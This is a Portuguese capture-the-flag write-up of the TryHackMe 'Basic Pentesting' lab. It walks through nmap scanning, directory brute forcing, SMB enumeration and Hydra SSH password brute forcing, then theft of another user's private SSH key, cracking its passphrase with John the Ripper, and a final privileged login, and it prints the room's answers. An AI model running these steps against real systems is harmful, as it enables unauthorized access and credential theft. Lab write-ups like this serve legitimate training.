# Basic Pentesting - TryHackMe  
**Dificuldade:** F√°cil  
**Data:** 11/08/2025  

---

> **Aviso importante:**  
> Este write-up refere-se a um laborat√≥rio p√∫blico dispon√≠vel no TryHackMe. Todo o conte√∫do aqui √© destinado a fins educacionais e de aprendizado em seguran√ßa da informa√ß√£o.  

**Laborat√≥rio dispon√≠vel em:** `https://tryhackme.com/room/basicpentestingjt`

---

### 1. Implante a m√°quina e conecte-se √† nossa rede
**Resposta:** `N√£o √© necess√°ria resposta`

---

### 2. Encontre os servi√ßos expostos pela m√°quina
**Resposta:** `N√£o √© necess√°ria resposta`

Para mapear os servi√ßos que est√£o em execu√ß√£o na m√°quina, utilizamos o Nmap com os seguintes par√¢metros:

- `-T5`: modo r√°pido de scan  
- `-sC`: scripts padr√£o do Nmap  
- `-sV`: detec√ß√£o de vers√£o dos servi√ßos  
- `-Pn`: desabilita ping, assume host ativo

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# nmap -T5 -sC -sV -Pn 10.201.18.169
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 10:18 -03
Nmap scan report for 10.201.18.169
Host is up (0.29s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:c6:2c:94:4f:58:60:5c:a4:f5:04:9e:26:42:fb:c1 (RSA)
|   256 19:38:fe:53:f3:7e:f1:20:90:94:02:fb:31:e7:64:e7 (ECDSA)
|_  256 c0:67:82:af:48:97:04:cb:a0:e4:ff:e9:fb:34:5d:13 (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-08-11T13:19:33
|_  start_date: N/A
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 37s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.20 seconds
```

Podemos observar que a m√°quina est√° executando os seguintes servi√ßos importantes:

- SSH na porta 22

- Servidor HTTP Apache na porta 80

- Samba nas portas 139 e 445

- Apache Tomcat na porta 8080

---

### 3. Qual √© o nome do diret√≥rio oculto no servidor web (digite o nome sem /)?

Ao acessar a p√°gina principal via HTTP (porta 80), visualizamos uma mensagem de manuten√ß√£o

![P√°gina inicial porta 80](img1.png)

Para descobrir diret√≥rios ocultos, utilizamos o feroxbuster, uma ferramenta de brute force para diret√≥rios e arquivos web. (tamb√©m pode ser utilizado ferramentas como dirb, gobuster ou outro de sua prefer√™ncia para brute force de diret√≥rios)

```
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# feroxbuster -u http://10.201.18.169 -w /usr/share/wordlists/dirb/common.txt
                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ü§ì                 ver: 2.11.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://10.201.18.169
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/wordlists/dirb/common.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.11.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       10l       24w      158c http://10.201.18.169/
301      GET        9l       28w      320c http://10.201.18.169/development => http://10.201.18.169/development/
200      GET        9l       89w      483c http://10.201.18.169/development/dev.txt
200      GET        7l       42w      235c http://10.201.18.169/development/j.txt
200      GET       10l       24w      158c http://10.201.18.169/index.html
[####################] - 29s     4617/4617    0s      found:5       errors:0      
[####################] - 29s     4614/4614    159/s   http://10.201.18.169/ 
[####################] - 1s      4614/4614    8123/s  http://10.201.18.169/development/ => Directory listing (add --scan-dir-listings to scan)
```

O feroxbuster encontrou o diret√≥rio **/development/**, que cont√©m arquivos acess√≠veis.

**Resposta:** `development`

---

### 4. For√ßa bruta do usu√°rio para encontrar o nome de usu√°rio e a senha
**N√£o √© necess√°ria resposta** <br>

Explorando o diret√≥rio oculto `/development`, encontramos os arquivos `dev.txt` e `j.txt` com algumas anota√ß√µes internas da equipe.

![Diretorio Oculto](img2.png)

- No `dev.txt` h√° men√ß√£o ao uso da vers√£o 2.5.12 do Apache Struts e que o SMB foi configurado.  
- Em `j.txt` √© feita uma refer√™ncia a uma auditoria das senhas no arquivo `/etc/shadow` e alerta para a necessidade de troca da senha do usu√°rio **J**.

Com base nessas informa√ß√µes e nos resultados do Nmap, sabemos que o SMB est√° ativo. Para enumerar usu√°rios e compartilhamentos SMB, usamos a ferramenta **enum4linux**, que coleta informa√ß√µes do servi√ßo SMB.

```
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# enum4linux 10.201.18.169 
<TRECHO OMITIDO>
[+] Attempting to map shares on 10.201.18.169

//10.201.18.169/Anonymous	Mapping: OK Listing: OK Writing: N/A

```

O enum4linux conseguiu mapear um compartilhamento chamado `Anonymous`, que permite acesso sem autentica√ß√£o.

Para interagir com esse compartilhamento, utilizamos o smbclient:

```
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# smbclient //10.201.18.169/Anonymous
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 14:31:20 2018
  ..                                  D        0  Thu Apr 19 14:13:06 2018
  staff.txt                           N      173  Thu Apr 19 14:29:55 2018

		14282840 blocks of size 1024. 6260288 blocks available
```
Extra√≠mos o arquivo `staff.txt` para an√°lise:
```
smb: \> get staff.txt
smb: \> exit

‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# cat staff.txt
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```
No texto, h√° uma men√ß√£o direta ao usu√°rio `Jan`, que √© um prov√°vel usu√°rio v√°lido na m√°quina.

---

### 5. Qual √© o nome de usu√°rio?

**Resposta:** `jan`

---

### 6. Qual √© a senha?
Agora que temos o nome do usu√°rio, podemos tentar fazer um brute force para encontrar a senha SSH do usu√°rio jan. Para isso, utilizamos a ferramenta `Hydra` com a wordlist `rockyou.txt`:

```
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.201.18.169      
[STATUS] 189.33 tries/min, 568 tries in 00:03h, 14343833 to do in 1262:40h, 14 active
[22][ssh] host: 10.201.18.169   login: jan   password: armando
```
**Resposta:** `armando`

---

### 7. Que servi√ßo voc√™ usa para acessar o servidor (resposta abreviada em letras mai√∫sculas)?

**Resposta:** `SSH`

---

### 8. Enumere a m√°quina para encontrar quaisquer vetores para escalonamento de privil√©gios

**Resposta:** `N√£o √© necess√°ria resposta`

---

### 9. Qual √© o nome do outro usu√°rio que voc√™ encontrou (todos em letras min√∫sculas)?

Ap√≥s acesso SSH com o usu√°rio `jan`, listamos os diret√≥rios no `/home` para verificar a presen√ßa de outros usu√°rios:

```
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# ssh jan@10.201.18.169

jan@ip-10-201-18-169:~$ pwd
/home/jan
jan@ip-10-201-18-169:~$ ls /home
jan  kay  ubuntu
```
Al√©m do usu√°rio `jan`, identificamos o usu√°rio `kay`.

**Resposta:** `kay`

---

### 10. Se voc√™ encontrou outro usu√°rio, o que pode fazer com essas informa√ß√µes?

**Resposta:** `N√£o √© necess√°ria resposta`

Explorando o diret√≥rio home do usu√°rio `kay`, encontramos a pasta oculta `.ssh/` contendo arquivos importantes para autentica√ß√£o:

```
jan@ip-10-201-18-169:~$ cd /home/kay
jan@ip-10-201-18-169:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 5 root root 4096 Aug 11 09:16 ..
-rw------- 1 kay  kay   789 Jun 22 13:41 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@ip-10-201-18-169:/home/kay$ cd .ssh/
jan@ip-10-201-18-169:/home/kay/.ssh$ ls -la
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
jan@ip-10-201-18-169:/home/kay/.ssh$ 
```

O arquivo `id_rsa` √© a chave privada SSH do usu√°rio `kay`. Para utiliz√°-la, primeiro extra√≠mos esse arquivo para nossa m√°quina local via SCP:

```
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# scp jan@10.201.18.169:/home/kay/.ssh/id_rsa .

jan@10.201.18.169's password: 
id_rsa                                          100% 3326     5.8KB/s   00:00  
```

Ap√≥s baixar o arquivo, devemos utilizar o m√≥dulo `ssh2john` do John The Ripper para converter a chave privada em um formato compativel para quebra de senha:

```
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# ssh2john id_rsa > hash.txt    
```

Agora usamos o John the Ripper com a wordlist `rockyou.txt` para tentar descobrir a senha da chave privada:

```                                                                   
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2025-08-11 10:50) 14.28g/s 1182Kp/s 1182Kc/s 1182KC/s behlat..bammer
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
**Ap√≥s a execu√ß√£o, a senha encontrada foi:** `beeswax`

Antes de utilizarmos a chave, ajustamos as permiss√µes para evitar erros no SSH:

```
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# chmod 600 id_rsa 
```

Por fim, acessamos o servidor via SSH com o usu√°rio `kay`, usando a chave privada e a senha encontrada:

```
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# ssh kay@10.201.18.169 -i id_rsa 
Enter passphrase for key 'id_rsa': beeswax
```
---

### 11. Qual √© a senha final que voc√™ obt√©m?
Dentro do diret√≥rio home do usu√°rio `kay`, encontramos o arquivo `pass.bak` contendo a senha final:

```
kay@ip-10-201-18-169:~$ ls
pass.bak
kay@ip-10-201-18-169:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

**Resposta:** `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

<div align="center"> <h2>CTF CONCLU√çDO! üö©üèÜ</h2> </div>